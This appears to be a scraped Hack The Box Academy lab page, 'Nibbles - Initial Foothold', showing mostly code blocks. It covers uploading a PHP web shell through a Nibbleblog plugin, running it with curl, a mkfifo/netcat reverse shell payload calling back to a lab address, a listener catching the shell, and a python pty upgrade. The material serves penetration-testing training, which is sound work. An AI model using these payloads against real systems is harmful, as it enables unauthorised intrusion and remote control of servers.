<!--
 // Platform: Academy
// URL: https://academy.hackthebox.com/module/77/section/852
// Platform Version: V1
// Module ID: 77
// Module Name: Getting Started
// Module Difficulty: Fundamental
// Section ID: 852
// Section Title: Nibbles - Initial Foothold
// Page Title: Getting Started
// Page Number: 17
-->

# Nibbles - Initial Foothold

**Module Name:** Getting Started **Page Number:** 17

#### GETTING STARTED

# Nibbles - Initial Foothold

![https://academy.hackthebox.com/storage/modules/77/plugins.png](https://academy.hackthebox.com/storage/modules/77/plugins.png)

``` php
<?php system('id'); ?>
```

![https://academy.hackthebox.com/storage/modules/77/upload.png](https://academy.hackthebox.com/storage/modules/77/upload.png)

``` shell-session
Warning: imagesx() expects parameter 1 to be resource, boolean given in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 26

Warning: imagesy() expects parameter 1 to be resource, boolean given in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 27

Warning: imagecreatetruecolor(): Invalid image dimensions in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 117

Warning: imagecopyresampled() expects parameter 1 to be resource, boolean given in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 118

Warning: imagejpeg() expects parameter 1 to be resource, boolean given in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 43

Warning: imagedestroy() expects parameter 1 to be resource, boolean given in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 80
```

``` shell-session
[!bash!]$ curl http://10.129.42.190/nibbleblog/content/private/plugins/my_image/image.php

uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
```

``` shell-session
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKING IP> <LISTENING PORT) >/tmp/f
```

``` php
<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 9443 >/tmp/f"); ?>
```

``` shell-session
0xdf@htb[/htb]$ nc -lvnp 9443

listening on [any] 9443 ...
```

``` shell-session
[!bash!]]$ nc -lvnp 9443

listening on [any] 9443 ...
connect to [10.10.14.2] from (UNKNOWN) [10.129.42.190] 40106
/bin/sh: 0: can't access tty; job control turned off
$ id

uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
```

``` bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

``` shell-session
$ python -c 'import pty; pty.spawn("/bin/bash")'

/bin/sh: 3: python: not found

$ which python3

/usr/bin/python3
```

``` shell-session
nibbler@Nibbles:/home/nibbler$ ls

ls
personal.zip  user.txt
```

# 

# 

#### Questions

####